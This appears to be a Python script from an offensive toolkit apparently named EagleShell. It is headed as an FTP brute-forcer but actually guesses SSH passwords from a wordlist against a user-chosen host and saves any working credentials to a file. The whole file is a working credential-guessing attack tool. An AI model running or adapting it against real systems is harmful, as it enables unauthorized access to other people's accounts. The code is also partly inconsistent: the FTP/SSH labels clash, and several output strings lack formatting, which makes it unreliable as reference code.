#!/usr/bin/python3

# BruteFTP - FTP Brute Force Script

# Imports all needed variables and packages
from assets.banners import brutessh_banner
from assets.designs import *
from assets.properties import clear_screen
from assets.redirect import redirect_eagleshell_brute_force
import os
import paramiko
import socket
import time


def brutessh_main():

    # Function that takes some user input
    def configuration():
        try:
            global host_set
            global user_set
            global wordlist_set
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(brutessh_banner)
            print(line)
            print('')
            print(author)
            print('Configuration:')
            print('')
            # hostname or IP address of the FTP server
            print('\tHost Input')
            print('\tExample: 10.10.10.15')
            print('')
            # username of the FTP server, root as default for linux
            print('\tUser Input:')
            print('\tExample: admin')
            print('')
            # wordlist to use
            print('\tWordlist Input')
            print('\tExample: /usr/share/wordlists/rockyou.txt')
            print('')
            print('\tZ): Back')
            print('\tX): Exit')
            print('')
            os.system('sleep 0.01')
            while True:
                host_set = input('\u001b[33mHOST \u001b[37m> ').lower()
                if host_set == 'z':
                    redirect_eagleshell_brute_force()
                elif host_set == 'x':
                    exit_shell()
                user_set = input('\u001b[33mUSER \u001b[37m> ').lower()
                if user_set == 'z':
                    redirect_eagleshell_brute_force()
                elif user_set == 'x':
                    exit_shell()
                wordlist_set = input('\u001b[33mWORDLIST \u001b[37m> ').lower()
                if wordlist_set == 'z':
                    redirect_eagleshell_brute_force()
                elif wordlist_set == 'x':
                    exit_shell()
                process()
        except KeyboardInterrupt:
            exit_shell()

    def is_ssh_open(hostname, username, password):
        # initialize SSH client
        client = paramiko.SSHClient()
        # add to know hosts
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=hostname, username=username, password=password, timeout=3)
        except socket.timeout:
            # this is when host is unreachable
            print("\u001b[31m[!] Host: {hostname} is unreachable, timed out.{Style.RESET_ALL}")
            return False
        except paramiko.AuthenticationException:
            print("\u001b[31m[!] Invalid credentials for {username}:{password}")
            return False
        except paramiko.SSHException:
            print("\u001b[36;1m[*] Quota exceeded, retrying with delay...")
            # sleep for a minute
            time.sleep(60)
            return is_ssh_open(hostname, username, password)
        else:
            # connection was established successfully
            print("\u001b[32;1m[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{Style.RESET_ALL}")
            return True

    def process():
        # read the file
        passwords = open(wordlist_set).read().split("\n")
        # brute-force
        for password in passwords:
            if is_ssh_open(host_set, user_set, password):
                # if combo is valid, save it to a file
                open("credentials.txt", "w").write(f"{user_set}@{host_set}:{password}")
                break

    # The function where you exit
    def exit_shell():
        print('\n\u001b[31m[-] Exiting EagleShell')
        print('\u001b[0m')
        os.system('sleep 2')
        os.system(clear_screen)
        exit()

    configuration()


brutessh_main()
